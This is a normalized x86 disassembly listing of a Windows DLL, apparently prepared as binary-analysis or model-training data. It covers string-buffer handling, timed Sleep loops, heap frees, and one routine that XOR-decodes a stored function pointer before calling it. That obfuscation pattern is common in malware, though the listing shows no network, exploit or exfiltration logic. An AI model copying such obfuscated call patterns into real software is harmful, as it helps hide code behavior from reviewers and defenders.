ja r-xdata
push r--data
call sub_100651be
call sub_10012830
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x3
ja r-xdata
mov ecx [ ebp - 0x164 ]
lea eax [ esi + 0x54 ]
push eax
push ecx
lea eax [ ebp - 0x154 ]
call sub_100215e0
mov edx [ ebp - 0x15c ]
push edx
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x188 ] eax
call sub_10051c40
add esp 0x4
push eax
lea eax [ ebp - 0x128 ]
push r--data
push eax
mov [ ebp - 0x4 ] 0x5
call sub_100282d0
add esp 0xc
mov [ ebp - 0x4 ] 0x7
cmp [ ebp - 0x34 ] 0x10
jb r-xdata
push r--data
call sub_100651be
mov ecx [ ebp - 0x150 ]
mov esi [ ebp - 0x154 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
cmp eax 0x4
ja r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_1000a86e
add esp 0x4
lea eax [ esi + 0x70 ]
push eax
lea eax [ ebp - 0x154 ]
call sub_10003290
mov ecx [ ebp - 0x164 ]
push eax
push ecx
lea edi [ ebp - 0x128 ]
call sub_10017cc0
mov ecx [ ebp - 0x150 ]
mov esi [ ebp - 0x154 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x4
ja r-xdata
push r--data
call sub_100651be
mov ecx [ ebp - 0x164 ]
lea eax [ esi + 0x70 ]
push eax
push ecx
lea eax [ ebp - 0x154 ]
call sub_100215e0
push 0x227a9
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x15c ] eax
call sub_10051c40
add esp 0x4
push eax
lea edx [ ebp - 0xf0 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0x8
call sub_100282d0
add esp 0xc
mov [ ebp - 0x4 ] 0xa
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push r--data
call sub_100651be
mov ecx [ ebp - 0x150 ]
mov esi [ ebp - 0x154 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
cmp ecx 0x5
ja r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_1000a86e
add esp 0x4
lea eax [ esi + 0x8c ]
push eax
lea eax [ ebp - 0x154 ]
call sub_10003290
mov esi [ ebp - 0x164 ]
push eax
push esi
lea edi [ ebp - 0xf0 ]
call sub_10017cc0
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x5
ja r-xdata
push r--data
call sub_100651be
lea eax [ edi + 0x8c ]
push eax
push esi
lea eax [ ebp - 0x154 ]
call sub_100215e0
mov [ ebp - 0x180 ] eax
mov [ ebp - 0xc0 ] 0xf
mov [ ebp - 0xc4 ] ebx
mov [ ebp - 0xd4 ] bl
mov eax [ ebp - 0x170 ]
mov [ ebp - 0x4 ] 0xb
cmp [ eax + 0x10 ] ebx
je r-xdata
push r--data
call sub_100651be
mov edx [ ebp - 0x184 ]
push edx
lea eax [ ebp - 0x64 ]
push eax
call sub_10015820
mov esi eax
lea ecx [ ebp - 0x9c ]
push ecx
lea edx [ ebp - 0x48 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0xd
call sub_10003080
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0xe
call sub_10069410
mov edi eax
mov [ ebp - 0x4 ] 0xf
mov esi [ ebp - 0x150 ]
mov ecx [ ebp - 0x154 ]
sub esi ecx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
push eax
lea ecx [ ebp - 0x2c ]
push r--data
push ecx
call sub_10003080
add esp 0xc
push eax
lea ecx [ ebp - 0xd4 ]
mov [ ebp - 0x4 ] 0xc
call sub_1003acf0
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push 0xffffffff
push ebx
push edi
call sub_10004e10
mov esi 0x10
cmp [ ebp - 0x18 ] esi
jb r-xdata
push r--data
call sub_100651be
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x6
ja r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_1000a86e
add esp 0x4
mov edi 0xf
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_1000a86e
add esp 0x4
lea eax [ edi + 0xa8 ]
push eax
lea eax [ ebp - 0x154 ]
call sub_10003290
push eax
push esi
lea edi [ ebp - 0xd4 ]
call sub_10017cc0
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x6
ja r-xdata
push r--data
call sub_100651be
mov [ ebp - 0x4 ] 0xb
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
cmp [ ebp - 0x50 ] esi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_1000a86e
add esp 0x4
lea eax [ edi + 0xa8 ]
push eax
push esi
lea eax [ ebp - 0x154 ]
call sub_100215e0
mov [ ebp - 0x17c ] eax
push r--data
call sub_100651be
mov ecx [ ebp - 0x168 ]
push ecx
lea edx [ ebp - 0x64 ]
push edx
call sub_10015820
mov esi eax
lea eax [ ebp - 0x10c ]
push eax
lea ecx [ ebp - 0x48 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x10
call sub_10003080
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x11
call sub_10069410
mov esi eax
mov [ ebp - 0x4 ] 0x12
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_1000a86e
add esp 0x4
push 0xffffffff
push ebx
lea ecx [ edi + 0x1c ]
push esi
call sub_10004e10
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push r--data
call sub_100651be
mov edi 0x10
mov esi 0xf
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x4 ] 0xb
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
cmp [ ebp - 0x50 ] edi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0x18c ]
push ecx
lea edx [ ebp - 0x64 ]
push edx
call sub_10015820
mov esi eax
lea eax [ ebp - 0xb8 ]
push eax
lea ecx [ ebp - 0x48 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x13
call sub_10003080
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x14
call sub_10069410
mov esi eax
mov [ ebp - 0x4 ] 0x15
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_1000a86e
add esp 0x4
push 0xffffffff
push ebx
lea ecx [ edi + 0x38 ]
push esi
call sub_10004e10
mov esi 0x10
cmp [ ebp - 0x18 ] esi
jb r-xdata
push r--data
call sub_100651be
mov edi 0xf
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x4 ] 0xb
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
cmp [ ebp - 0x50 ] esi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0x188 ]
push ecx
lea edx [ ebp - 0x64 ]
push edx
call sub_10015820
mov esi eax
lea eax [ ebp - 0x80 ]
push eax
lea ecx [ ebp - 0x48 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x16
call sub_10003080
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x17
call sub_10069410
mov esi eax
mov [ ebp - 0x4 ] 0x18
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_1000a86e
add esp 0x4
push 0xffffffff
push ebx
lea ecx [ edi + 0x54 ]
push esi
call sub_10004e10
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push r--data
call sub_100651be
mov edi 0x10
mov esi 0xf
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x4 ] 0xb
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
cmp [ ebp - 0x50 ] edi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0x15c ]
push ecx
lea edx [ ebp - 0x64 ]
push edx
call sub_10015820
mov esi eax
lea eax [ ebp - 0x128 ]
push eax
lea ecx [ ebp - 0x48 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x19
call sub_10003080
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1a
call sub_10069410
mov esi eax
mov [ ebp - 0x4 ] 0x1b
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x4
ja r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_1000a86e
add esp 0x4
push 0xffffffff
push ebx
lea ecx [ edi + 0x70 ]
push esi
call sub_10004e10
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push r--data
call sub_100651be
mov esi 0x10
mov edi 0xf
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x4 ] 0xb
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
cmp [ ebp - 0x50 ] esi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0x180 ]
push ecx
lea edx [ ebp - 0x64 ]
push edx
call sub_10015820
mov esi eax
lea eax [ ebp - 0xf0 ]
push eax
lea ecx [ ebp - 0x48 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x1c
call sub_10003080
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1d
call sub_10069410
mov esi eax
mov [ ebp - 0x4 ] 0x1e
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x5
ja r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_1000a86e
add esp 0x4
push 0xffffffff
push ebx
lea ecx [ edi + 0x8c ]
push esi
call sub_10004e10
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push r--data
call sub_100651be
mov edi 0x10
mov esi 0xf
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x4 ] 0xb
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
cmp [ ebp - 0x50 ] edi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0x170 ]
cmp [ ecx + 0x10 ] ebx
je r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_1000a86e
add esp 0x4
lea ecx [ ebp - 0x144 ]
push ecx
lea edi [ ebp - 0x154 ]
call sub_1001e5a0
xor ecx ecx
mov [ ebp - 0x4 ] 0x22
xor edx edx
mov [ ebp - 0x178 ] ebx
mov [ ebp - 0x160 ] ecx
mov [ ebp - 0x174 ] ebx
mov [ ebp - 0x155 ] bl
mov [ ebp - 0x15c ] edx
mov edx [ ebp - 0x17c ]
push edx
lea eax [ ebp - 0x64 ]
push eax
call sub_10015820
mov esi eax
lea ecx [ ebp - 0xd4 ]
push ecx
lea edx [ ebp - 0x48 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0x1f
call sub_10003080
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x20
call sub_10069410
mov esi eax
mov [ ebp - 0x4 ] 0x21
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x6
ja r-xdata
push 0x61a8
call [ Sleep@IAT ]
mov eax [ ebp - 0x160 ]
cmp eax ebx
je r-xdata
cmp edx ebx
je r-xdata
push 0xffffffff
push ebx
lea ecx [ edi + 0xa8 ]
push esi
call sub_10004e10
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push r--data
call sub_100651be
mov edi 0x10
cmp [ ebp - 0x130 ] edi
jb r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebp - 0x160 ] ebx
cmp ecx ebx
je r-xdata
push 0xdac
call [ Sleep@IAT ]
mov ecx [ ebp - 0x160 ]
mov esi 0x10
mov edi 0xf
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_1000a86e
add esp 0x4
mov esi 0xf
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x134 ] ebx
mov [ ebp - 0x144 ] bl
cmp [ ebp - 0xc0 ] edi
jb r-xdata
mov eax [ ebp - 0x144 ]
push eax
call sub_1000a86e
add esp 0x4
mov edx [ ebp - 0x164 ]
mov esi [ edx + 0xec ]
mov edi [ esi ]
lea eax [ ebp - 0x174 ]
push eax
mov eax [ ebp - 0x134 ]
lea ecx [ ebp - 0x160 ]
push ecx
lea edx [ ebp - 0x178 ]
push edx
push eax
lea ecx [ ebp - 0x144 ]
call sub_10063af0
mov edx [ edi + 0x8 ]
push eax
push ebx
mov ecx esi
call edx
mov edx [ ebp - 0x15c ]
mov ecx [ ebp - 0x160 ]
inc edx
mov [ ebp - 0x15c ] edx
cmp ecx ebx
je r-xdata
push ecx
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebp - 0x160 ] ebx
mov [ ebp - 0x4 ] 0xb
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
cmp [ ebp - 0x50 ] esi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0xc0 ] esi
mov [ ebp - 0xc4 ] ebx
mov [ ebp - 0xd4 ] bl
cmp [ ebp - 0xdc ] edi
jb r-xdata
mov ecx [ ebp - 0xd4 ]
push ecx
call sub_1000a86e
add esp 0x4
cmp eax ebx
jne r-xdata
cmp [ ecx ] bl
je r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_1000a86e
add esp 0x4
mov [ ebp - 0xdc ] esi
mov [ ebp - 0xe0 ] ebx
mov [ ebp - 0xf0 ] bl
cmp [ ebp - 0x114 ] edi
jb r-xdata
mov edx [ ebp - 0xf0 ]
push edx
call sub_1000a86e
add esp 0x4
cmp edx 0x5
jg r-xdata
cmp [ ebp - 0x178 ] 0xc8
jne r-xdata
cmp [ ebp - 0x174 ] ebx
je r-xdata
mov [ ebp - 0x114 ] esi
mov [ ebp - 0x118 ] ebx
mov [ ebp - 0x128 ] bl
cmp [ ebp - 0x6c ] edi
jb r-xdata
mov eax [ ebp - 0x128 ]
push eax
call sub_1000a86e
add esp 0x4
cmp [ ebp - 0x155 ] 0x1
jne r-xdata
mov [ ebp - 0x155 ] 0x1
mov [ ebp - 0x6c ] esi
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x80 ] bl
cmp [ ebp - 0xa4 ] edi
jb r-xdata
mov ecx [ ebp - 0x80 ]
push ecx
call sub_1000a86e
add esp 0x4
cmp ecx ebx
je r-xdata
mov [ ebp - 0xa4 ] esi
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0xb8 ] bl
cmp [ ebp - 0xf8 ] edi
jb r-xdata
mov edx [ ebp - 0xb8 ]
push edx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x15c ] 0x3
jmp r-xdata
mov edx [ ebp - 0x16c ]
push edx
lea eax [ ebp - 0x174 ]
push eax
call sub_10024310
mov [ ebp - 0x15c ] eax
mov eax [ ebp - 0x160 ]
cmp eax ebx
je r-xdata
mov [ ebp - 0xf8 ] esi
mov [ ebp - 0xfc ] ebx
mov [ ebp - 0x10c ] bl
cmp [ ebp - 0x88 ] edi
jb r-xdata
mov eax [ ebp - 0x10c ]
push eax
call sub_1000a86e
add esp 0x4
mov edi 0x10
cmp [ ebp - 0x130 ] edi
jb r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebp - 0x160 ] ebx
mov eax [ ebp - 0x154 ]
mov [ ebp - 0x88 ] esi
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x9c ] bl
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x9c ]
push ecx
call sub_1000a86e
add esp 0x4
mov esi 0xf
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x134 ] ebx
mov [ ebp - 0x144 ] bl
cmp [ ebp - 0xc0 ] edi
jb r-xdata
mov ecx [ ebp - 0x144 ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax 0x43
jmp r-xdata
mov edx [ ebp - 0x16c ]
push edx
mov edx [ ebp - 0x150 ]
lea ecx [ ebp - 0x148 ]
push ecx
push edx
push eax
call sub_10072070
mov eax [ ebp - 0x154 ]
push eax
call sub_1000a86e
add esp 0x14
mov [ ebp - 0xc0 ] esi
mov [ ebp - 0xc4 ] ebx
mov [ ebp - 0xd4 ] bl
cmp [ ebp - 0xdc ] edi
jb r-xdata
mov edx [ ebp - 0xd4 ]
push edx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0xdc ] esi
mov [ ebp - 0xe0 ] ebx
mov [ ebp - 0xf0 ] bl
cmp [ ebp - 0x114 ] edi
jb r-xdata
mov eax [ ebp - 0xf0 ]
push eax
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x114 ] esi
mov [ ebp - 0x118 ] ebx
mov [ ebp - 0x128 ] bl
cmp [ ebp - 0x6c ] edi
jb r-xdata
mov ecx [ ebp - 0x128 ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x6c ] esi
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x80 ] bl
cmp [ ebp - 0xa4 ] edi
jb r-xdata
mov edx [ ebp - 0x80 ]
push edx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0xa4 ] esi
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0xb8 ] bl
cmp [ ebp - 0xf8 ] edi
jb r-xdata
mov eax [ ebp - 0xb8 ]
push eax
call sub_1000a86e
add esp 0x4
mov [ ebp - 0xf8 ] esi
mov [ ebp - 0xfc ] ebx
mov [ ebp - 0x10c ] bl
cmp [ ebp - 0x88 ] edi
jb r-xdata
mov ecx [ ebp - 0x10c ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax [ ebp - 0x154 ]
mov [ ebp - 0x88 ] esi
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x9c ] bl
cmp eax ebx
je r-xdata
mov edx [ ebp - 0x9c ]
push edx
call sub_1000a86e
add esp 0x4
mov eax [ ebp - 0x15c ]
mov ecx [ ebp - 0x16c ]
push ecx
mov ecx [ ebp - 0x150 ]
lea edx [ ebp - 0x148 ]
push edx
push ecx
push eax
call sub_10072070
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x14
sub_1002b11f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10051cf5
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x107
lea eax [ ebp - 0x10 ]
push eax
push 0x107
push [ ebp + 0x8 ]
call sub_100718ba
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_1002b180
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x70 ] ecx
push edi
mov ecx ebx
mov [ ebp - 0x68 ] eax
call sub_10024100
test eax eax
je r-xdata
mov eax [ ebx + 0x1c ]
xor edi edi
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x64 ] edi
mov edx [ eax ]
mov edx [ edx + 0x88 ]
push ecx
push eax
call edx
test eax eax
jns r-xdata
lea edx [ ebp - 0x60 ]
mov eax 0x31
call sub_1002f620
mov eax 0x1
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x64 ]
push eax
call [ SysStringLen@IAT ]
mov esi eax
mov [ ebp - 0x6c ] esi
cmp [ ebx + 0x140 ] edi
je r-xdata
lea edx [ ebp - 0x58 ]
mov eax 0xa3
call sub_1002f620
lea eax [ edi + 0x2 ]
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
add esi edi
add esi esi
push esi
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp - 0x68 ]
mov [ ecx ] eax
test eax eax
jne r-xdata
push r--data
call [ lstrlenA@IAT ]
mov edi eax
cmp [ ebx + 0x140 ] 0x0
je r-xdata
lea edx [ ebp - 0x60 ]
mov eax 0x71
call sub_1002f620
mov eax 0x3
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x6c ]
mov ecx [ ebp - 0x64 ]
lea eax [ edx + edx ]
mov edx [ ebp - 0x68 ]
push eax
mov eax [ edx ]
push ecx
add eax edi
push eax
call sub_1007f580
mov eax [ ebp - 0x64 ]
mov ecx [ ebp - 0x70 ]
add esp 0xc
mov [ ecx ] esi
test eax eax
je r-xdata
push edi
push r--data
push eax
call sub_1007f580
add esp 0xc
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
push eax
call [ SysFreeString@IAT ]
sub_1002b2e0
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx ecx
push edi
mov edi [ ebx + 0x4 ]
mov [ ebp - 0x28 ] ebx
test edi edi
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax 0x12
call sub_1002f620
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0xaa
call sub_1002f620
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push edi
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea eax [ ebx + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push ebx
push edi
push eax
mov [ esi + 0x4 ] eax
call sub_1007f580
mov ebx [ ebp - 0x28 ]
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x4 ] 0x0
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea ecx [ edi + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0x8 ] eax
call sub_1007f580
add esp 0xc
pop edi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x8 ] 0x0
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
sub_1002b3c0
push ebp
mov ebp esp
sub esp 0x24
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
xor eax eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
mov al 0x38
xor [ ebp + 0x8 ] al
xor [ ebp + 0x9 ] al
xor [ ebp + 0xa ] al
xor [ ebp + 0xb ] al
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov edx [ ebp + 0x1c ]
lea ecx [ ebp - 0x24 ]
push ecx
mov [ ebp - 0x24 ] 0x8
mov [ ebp - 0x4 ] edx
call [ ebp + 0x8 ]
mov eax [ ebp - 0x1c ]
mov esp ebp
pop ebp
retn 0x18
sub_1002b41f
push 0x38
mov eax sub_1008571a
call sub_10047689
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_10007a10
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_1006b26d
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_1002be90
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_10046885
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1006995b
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] si
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100262c3
retn 0x20
sub_1002b500
push ebp
mov ebp esp
push 0xffffffff
push sub_1008947c
mov eax [ fs : 0x0 ]
push eax
